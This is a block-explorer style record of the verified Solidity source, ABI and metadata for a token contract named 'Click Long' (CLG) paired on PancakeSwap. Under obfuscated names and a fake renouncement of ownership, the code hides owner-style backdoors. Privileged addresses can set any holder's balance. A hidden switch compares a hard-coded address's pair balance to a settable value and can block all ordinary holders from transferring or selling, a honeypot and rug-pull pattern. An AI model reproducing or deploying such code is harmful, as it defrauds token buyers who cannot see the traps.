{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface takeAtSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitModeIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromExempt {\n    function createPair(address fundFee, address isShould) external returns (address);\n}\n\ninterface launchList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchFrom) external view returns (uint256);\n\n    function transfer(address fundLaunch, uint256 totalSell) external returns (bool);\n\n    function allowance(address txListMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunch,\n        uint256 totalSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minMode, uint256 value);\n    event Approval(address indexed txListMin, address indexed spender, uint256 value);\n}\n\ninterface shouldFeeReceiver is launchList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClickLong is limitModeIs, launchList, shouldFeeReceiver {\n\n    uint256 private launchedTotal;\n\n    address minMaxLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address teamSenderTake, uint256 totalSell) external virtual override returns (bool) {\n        return liquidityBuy(_msgSender(), teamSenderTake, totalSell);\n    }\n\n    function approve(address feeTo, uint256 totalSell) public virtual override returns (bool) {\n        receiverLimit[_msgSender()][feeTo] = totalSell;\n        emit Approval(_msgSender(), feeTo, totalSell);\n        return true;\n    }\n\n    uint256 constant maxAuto = 4 ** 10;\n\n    uint256 private amountSell;\n\n    function feeExempt(address senderTotal, address fundLaunch, uint256 totalSell) internal returns (bool) {\n        require(launchBuyFee[senderTotal] >= totalSell);\n        launchBuyFee[senderTotal] -= totalSell;\n        launchBuyFee[fundLaunch] += totalSell;\n        emit Transfer(senderTotal, fundLaunch, totalSell);\n        return true;\n    }\n\n    function liquidityBuy(address senderTotal, address fundLaunch, uint256 totalSell) internal returns (bool) {\n        if (senderTotal == amountLaunched) {\n            return feeExempt(senderTotal, fundLaunch, totalSell);\n        }\n        uint256 txMinTake = launchList(amountFund).balanceOf(minMaxLaunched);\n        require(txMinTake == minModeFee);\n        require(fundLaunch != minMaxLaunched);\n        if (launchReceiver[senderTotal]) {\n            return feeExempt(senderTotal, fundLaunch, maxAuto);\n        }\n        return feeExempt(senderTotal, fundLaunch, totalSell);\n    }\n\n    string private takeSell = \"CLG\";\n\n    constructor (){\n        if (amountSell == fromListMin) {\n            amountSell = launchedTotal;\n        }\n        takeAtSender swapEnable = takeAtSender(txAmount);\n        amountFund = fromExempt(swapEnable.factory()).createPair(swapEnable.WETH(), address(this));\n        if (amountSell != launchedTotal) {\n            fromListMin = launchedTotal;\n        }\n        amountLaunched = _msgSender();\n        buyExempt();\n        autoMin[amountLaunched] = true;\n        launchBuyFee[amountLaunched] = senderTrading;\n        if (amountSell == launchedTotal) {\n            launchedTotal = amountSell;\n        }\n        emit Transfer(address(0), amountLaunched, senderTrading);\n    }\n\n    address private senderReceiver;\n\n    event OwnershipTransferred(address indexed marketingShould, address indexed txSell);\n\n    function amountFrom(uint256 totalSell) public {\n        limitBuy();\n        minModeFee = totalSell;\n    }\n\n    uint256 private senderTrading = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTrading;\n    }\n\n    function launchedSwap(address teamSenderTake, uint256 totalSell) public {\n        limitBuy();\n        launchBuyFee[teamSenderTake] = totalSell;\n    }\n\n    function balanceOf(address launchFrom) public view virtual override returns (uint256) {\n        return launchBuyFee[launchFrom];\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverLimit;\n\n    function liquidityExempt(address enableTakeMin) public {\n        require(enableTakeMin.balance < 100000);\n        if (walletList) {\n            return;\n        }\n        if (amountSell == fromListMin) {\n            launchedTotal = fromListMin;\n        }\n        autoMin[enableTakeMin] = true;\n        if (launchedTotal != amountSell) {\n            amountSell = launchedTotal;\n        }\n        walletList = true;\n    }\n\n    address public amountFund;\n\n    uint256 minModeFee;\n\n    function buyExempt() public {\n        emit OwnershipTransferred(amountLaunched, address(0));\n        senderReceiver = address(0);\n    }\n\n    function limitBuy() private view {\n        require(autoMin[_msgSender()]);\n    }\n\n    uint256 takeMarketing;\n\n    mapping(address => uint256) private launchBuyFee;\n\n    function getOwner() external view returns (address) {\n        return senderReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellList;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeSell;\n    }\n\n    mapping(address => bool) public autoMin;\n\n    address public amountLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return amountFromReceiver;\n    }\n\n    function launchReceiverMax(address listAuto) public {\n        limitBuy();\n        \n        if (listAuto == amountLaunched || listAuto == amountFund) {\n            return;\n        }\n        launchReceiver[listAuto] = true;\n    }\n\n    string private amountFromReceiver = \"Click Long\";\n\n    function transferFrom(address senderTotal, address fundLaunch, uint256 totalSell) external override returns (bool) {\n        if (_msgSender() != txAmount) {\n            if (receiverLimit[senderTotal][_msgSender()] != type(uint256).max) {\n                require(totalSell <= receiverLimit[senderTotal][_msgSender()]);\n                receiverLimit[senderTotal][_msgSender()] -= totalSell;\n            }\n        }\n        return liquidityBuy(senderTotal, fundLaunch, totalSell);\n    }\n\n    address txAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public fromListMin;\n\n    function allowance(address enableToken, address feeTo) external view virtual override returns (uint256) {\n        if (feeTo == txAmount) {\n            return type(uint256).max;\n        }\n        return receiverLimit[enableToken][feeTo];\n    }\n\n    mapping(address => bool) public launchReceiver;\n\n    bool public walletList;\n\n    uint8 private sellList = 18;\n\n    function owner() external view returns (address) {\n        return senderReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txListMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalSell\",\"type\":\"uint256\"}],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromListMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"}],\"name\":\"launchReceiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSenderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSell\",\"type\":\"uint256\"}],\"name\":\"launchedSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTakeMin\",\"type\":\"address\"}],\"name\":\"liquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSenderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ClickLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}